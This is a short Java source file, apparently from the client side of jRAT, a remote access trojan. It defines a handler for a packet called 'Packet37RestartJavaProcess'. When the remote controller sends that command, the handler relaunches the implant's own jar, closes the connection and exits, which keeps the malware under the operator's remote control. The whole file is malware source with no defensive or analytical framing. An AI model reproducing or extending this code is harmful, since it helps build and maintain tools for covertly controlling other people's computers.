package jrat.client.packets.incoming;

import jrat.client.Connection;
import jrat.client.utils.Utils;
import jrat.common.downloadable.JavaArchive;

import java.io.File;

public class Packet37RestartJavaProcess extends AbstractIncomingPacket {

	@Override
	public void read(Connection con) throws Exception {
		File file = new File(Utils.getJarFile().getAbsolutePath());

		if (file.isFile()) {
			JavaArchive jar = new JavaArchive();
			jar.execute(file);
			
			try {
				con.getSocket().close();
			} catch (Exception ex) {
				
			}
			
			System.exit(0);
		}
	}

}
